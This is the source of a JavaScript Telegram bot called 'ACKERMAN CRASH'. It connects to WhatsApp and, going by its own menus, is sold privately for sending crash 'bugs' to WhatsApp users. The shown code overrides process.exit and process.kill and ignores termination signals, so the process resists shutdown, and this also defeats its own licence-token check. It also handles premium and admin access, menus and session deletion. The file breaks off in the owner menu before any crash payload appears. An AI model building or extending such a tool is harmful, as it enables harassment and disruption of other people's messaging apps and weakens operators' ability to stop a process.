require('./anti.js');

const axios = require("axios");
const chalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      chalk.blue(`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░`) +
        chalk.green("\n]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL TIDAK DIKETAHUI";
  console.error(
    chalk.green("𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}
axios.interceptors.request.use(requestInterceptor, errorInterceptor);
const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  },
});
const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  } else {
    return originalKill(pid, signal);
  }
};
["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log(chalk.red("SINYAL " + signal + " TERDETEKSI DAN DIABAIKAN"));
  });
});
function vvvvvvv2(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
     chalk.green("\n ]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function startProgressBar() {
    const progressSteps = [
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
    ];
    const colors = [
        chalk.redBright,
        chalk.yellowBright,
        chalk.greenBright,
        chalk.cyanBright,
        chalk.blueBright,
        chalk.magentaBright,
        chalk.whiteBright,
    ];
    let step = 0;
    let colorIndex = 0;
    setInterval(() => {
        console.clear();
        console.log(chalk.cyanBright(`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░`));
       axios.interceptors.request.use(vvvvvvv2, errorInterceptor);
        const color = colors[colorIndex % colors.length];
        console.log(color.bold(progressSteps[step]));
        
        step = (step + 1) % progressSteps.length;
        colorIndex++;
    }, 200);
}
startProgressBar();

const { Telegraf, Markup, session } = require("telegraf");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require('fs');
const path = require("path");
const pino = require("pino");
const moment = require("moment-timezone");
const config = require("./config.js");
const { BOT_TOKEN } = require("./config");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const sessionPath = './session';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);


bot.use(session());
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
//////// Fungsi blacklist user \\\\\\
const blacklist = ["6142885267", "7275301558"];
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
    "https://files.catbox.moe/c31sef.jpeg",
    "https://files.catbox.moe/09dfnh.jpg",
    "https://files.catbox.moe/c31sef.jpeg"
  ];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "bokep", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//////// FUNGSI VALID TOKEN \\\\\\\\\
const GITHUB_TOKEN_LIST_URL =
    "https://raw.githubusercontent.com/RAPZIIBASE/RapziRaw/refs/heads/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (validTokens && validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.green(`Token anda valid!`));
    const bot = new Telegraf(BOT_TOKEN);
    // ... kode bot lainnya ...
    startBot();
  } else {
    console.log(chalk.red("═══════════════════════════════════════════"));
    console.log(chalk.bold.red("Token Tidak Valid, Dasar Kacung"));
    console.log(chalk.red("═══════════════════════════════════════════"));
    process.exit(1);
  }
}

  console.log(chalk.green(`
▀█▀ █▀█ █▄▀ █▀▀ █▄░█     █░█ ▄▀█ █░ █ █▀▄
░█░ █▄█ █░█ ██▄ █░▀█     ▀▄▀ █▀█ █▄ █ █▄▀
  `));
  startBot();

function startBot() {
  console.log(
    chalk.blue(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣧⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣶⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣆⠀⢀⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣄⣀⣠⣤⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣷⣶⣶⣤⣤⣤⣤⣀⣀⣀⣀⣀⣰⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣹⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡆⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣿⣿⣿⣟⣁⠀⣿⡀⣀⣤⣾⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣭⣤⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⢸⡇⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣈⣹⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠋⢹⡇⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢙⣿⣿⣿⣿⣿⣿⡄⠙⠻⣿⠿⠿⠿⢿⡿⠛⠛⠛⠉⠉⠁⢸⣿⠀⠀⠀⠀⢸⡇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⣿⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢸⡇⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⣿⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⣸⡇⠀⠀⠀⠀⠀⠀⢸⣿⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠛⢿⣿⡿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⠋⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠻⠁⠹⠁⠛⠀⠀⠀
⠀⠀⠀⠘⠉⢿⠇⠙⠇⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣻⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠈⠻⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⠿⠿⠿⠿⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀
           ▀█▀ █▀█░  █▀ █▀█ █▀█  ░█▄▄ █░█ █▄█ █▄█ █ █▄░█ █▀▀
           ░█░ ▀▀█░  █▀ █▄█ █▀▄  ░█▄█ █▄█ ░█░ ░█░ █ █░▀█ █▄█


`));
  console.log(
    chalk.bold.green(`
┏═════════════┓
  Sucses Login
┗═════════════┛
    `));
}

validateToken();

///// --- Koneksi WhatsApp --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("WHATSAPP TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
/////==== Tap to reply ====\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("WhatsApp Is Not Connect Please Select Command /addsender...");
    return;
  }
  next();
};

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// Muat ID owner dan pengguna premium
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
const userId = ctx.from.id;
const chatId = ctx.chat.id;

  if (!isOwner(ctx.from.id)) {
    return ctx.reply("Khusus Owner...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("Khusus Premium..");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// -- Fungsi Memuat Daftar Owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

////=========MENU UTAMA========\\\\

bot.start(async (ctx) => {
  try {
    const Name = ctx.from.first_name || ctx.from.username || ctx.from.id;

    // ✅ Kirim foto dengan caption dan tombol dalam satu pesan
    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
\`\`\`
┏══────「 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 」───══┓
│   ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴜsᴇ ᴛʜᴇ sᴄʀɪᴘᴛ
┗══───────────────────────══┛ 
\`\`\`
      `,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝗢𝗣𝗘𝗡 𝗔𝗖𝗞𝗘𝗥", callback_data: "kong" }]
        ]
      }
    });

  } catch (err) {
    console.error("🔥 Error saat /start:", err);

    if (err.response?.error_code === 429) {
      const retry = err.response.parameters?.retry_after || 5;
      await ctx.reply(`❌ Bot sedang overload. Coba lagi dalam ${retry} detik.`, {
        reply_to_message_id: ctx.message.message_id
      });
    } else {
      await ctx.reply("💀 Bot gagal memulai.", {
        reply_to_message_id: ctx.message.message_id
      });
    }
  }
});

// Contoh handler untuk tombol "Menu"
bot.action("back", async (ctx) => {
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";

  const mainMenuMessage = `<blockquote>
Привет, я бот, который полезен для отправки ошибок 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 через бота Telegram, Я прошу вас использовать этого бота разумно и ответственно, наслаждайтесь.

╔─═⊱ 𝗔𝗖𝗞𝗘𝗥𝗠𝗔𝗡 𝗖𝗥𝗔𝗦𝗛 ─═⬡
║𖥂 ☇ 𝗗𝗲𝘃 : @RapziLord
║𖥂 ☇ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 2.0 GEN 1
║𖥂 ☇ 𝗦𝘁𝗮𝘁𝘂𝘀 : Buy Private Only
║𖥂 ☇ 𝗠𝗼𝗱𝘂𝗹𝗲 : Telegraf
║𖥂 ☇ 𝗦𝗶𝗻𝘁𝗮𝗸𝘀𝗶𝘀 : JavaScript
║𖥂 ☇ 𝗢𝗻𝗹𝗶𝗻𝗲 : ${waktuRunPanel}
┗━━━━━━━━━━━━━━━━━▢

ꜰᴏʀʏᴏᴜ ʙᴜɢ ʙᴜᴛᴛᴏɴ!! 
</blockquote>`;

  const media = {
    type: "video",
    media: "https://files.catbox.moe/aiaudi.mp4",
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const mainKeyboard = [
    [
      { text: "𝗕𝗨𝗚 𝗔𝗖𝗞𝗘𝗥", callback_data: "bug_menu" }
    ],
    [
      { text: "𝗢𝗪𝗡𝗘𝗥 𝗔𝗖𝗞𝗘𝗥", callback_data: "set_menu" }
    ],
    [
      { text: "𝗗𝗘𝗩𝗢𝗟𝗢𝗣𝗘𝗥", url: "https://t.me/RapziiLord" }
    ],
    [
       { text: "𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢", callback_data: "tqto" }
    ]
  ];

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  }
});
// Handler untuk set_menu
bot.action("set_menu", async (ctx) => {
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();
  const videoUrl = "https://files.catbox.moe/aiaudi.mp4";

  const mainMenuMessage = 
  `\`\`\`
┏══━「 𝗔𝗞𝗦𝗘𝗦 𝗔𝗖𝗞𝗘𝗥 」━══┓
│𖥂 /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
│𖥂 /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
